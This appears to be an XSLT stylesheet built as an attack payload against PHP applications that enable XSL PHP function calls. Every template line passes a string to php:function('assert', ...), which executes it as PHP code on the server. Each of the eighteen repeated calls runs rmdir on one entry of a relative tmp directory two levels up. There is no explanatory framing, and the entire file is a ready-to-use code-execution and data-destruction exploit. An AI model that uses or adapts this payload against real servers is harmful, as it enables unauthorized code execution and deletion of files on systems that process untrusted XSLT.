<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">

   
           <xsl:variable name="f">rmdir(glob('./../../tmp/*')[0])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $f)"/> 
   
           <xsl:variable name="g">rmdir(glob('./../../tmp/*')[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $g)"/> 
   
           <xsl:variable name="h">rmdir(glob('./../../tmp/*')[2])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $h)"/> 
      <xsl:variable name="i">rmdir(glob('./../../tmp/*')[3])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $i)"/> 
   
           <xsl:variable name="j">rmdir(glob('./../../tmp/*')[4])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $j)"/> 
   
           <xsl:variable name="k">rmdir(glob('./../../tmp/*')[5])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $k)"/> 
              <xsl:variable name="l">rmdir(glob('./../../tmp/*')[6])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $l)"/> 
   
           <xsl:variable name="m">rmdir(glob('./../../tmp/*')[7])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $m)"/> 
   
           <xsl:variable name="n">rmdir(glob('./../../tmp/*')[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $n)"/> 
              <xsl:variable name="o">rmdir(glob('./../../tmp/*')[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $o)"/> 
   
           <xsl:variable name="p">rmdir(glob('./../../tmp/*')[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $p)"/> 
   
           <xsl:variable name="qq">rmdir(glob('./../../tmp/*')[11])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $qq)"/> 

             <xsl:variable name="aa">rmdir(glob('./../../tmp/*')[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $aa)"/> 
           <xsl:variable name="a">rmdir(glob('./../../tmp/*')[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('./../../tmp/*')[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('./../../tmp/*')[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('./../../tmp/*')[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('./../../tmp/*')[17])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
</xsl:template> 
</xsl:stylesheet>
